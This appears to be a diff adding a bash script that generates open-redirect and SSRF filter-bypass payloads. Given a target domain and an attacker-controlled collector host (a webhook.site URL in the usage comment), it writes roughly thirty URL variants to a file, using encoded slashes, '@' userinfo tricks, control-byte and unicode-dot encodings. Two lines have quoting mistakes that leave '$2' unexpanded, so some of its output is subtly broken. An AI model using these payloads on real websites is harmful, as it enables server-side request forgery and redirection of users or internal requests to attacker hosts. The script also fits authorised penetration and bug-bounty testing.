@@ -1,0 +1,34 @@
+#!/bin/bash
+# ./url_redir_payload_generation targetwebsitename.com webhook.site/e607bc03-ac0e-47de-b86e-59f57d73bc19
+thiersites=$1
+mysite=$2
+
+echo '\/'$2|tee -a ssrf_redir.txt
+echo '\/\/'$2|tee -a ssrf_redir.txt
+echo '\\'$2|tee -a ssrf_redir.txt
+echo '//'$2|tee -a ssrf_redir.txt
+echo '//'$1'@'$2|tee -a ssrf_redir.txt
+echo '/\/'$2|tee -a ssrf_redir.txt
+echo 'https://'$2'%3F.'$2'/'|tee -a ssrf_redir.txt
+echo 'https://'$2'%2523.'$2'/'|tee -a ssrf_redir.txt
+echo 'https://'$2'?c=.'$2'/'|tee -a ssrf_redir.txt
+echo 'https://'$2'?c=.'$2'\'|tee -a ssrf_redir.txt
+echo '//%2F/'$2|tee -a ssrf_redir.txt
+echo '////'$2|tee -a ssrf_redir.txt
+echo 'https://'$1'puter/$2'|tee -a ssrf_redir.txt
+echo 'https://'$1'.'$2|tee -a ssrf_redir.txt
+echo '/%0D/'$2|tee -a ssrf_redir.txt
+echo '/%2F/'$2|tee -a ssrf_redir.txt
+echo '/%09/'$2|tee -a ssrf_redir.txt
+echo 'https;'$2|tee -a ssrf_redir.txt
+echo 'https:'$2|tee -a ssrf_redir.txt
+echo '/%00/'$2|tee -a ssrf_redir.txt
+echo 'https://'$1'/@'$2|tee -a ssrf_redir.txt
+echo 'https://'$1'\@'$2|tee -a ssrf_redir.txt
+echo '/%07/'$2|tee -a ssrf_redir.txt
+echo '/%0a/'$2|tee -a ssrf_redir.txt
+echo '/%5C'$2|tee -a ssrf_redir.txt
+echo '@'$2|tee -a ssrf_redir.txt
+echo $1'@'$2|tee -a ssrf_redir.txt
+echo '//'$2'%E3%80%82$2'|tee -a ssrf_redir.txt
+echo $2|tee -a ssrf_redir.txt
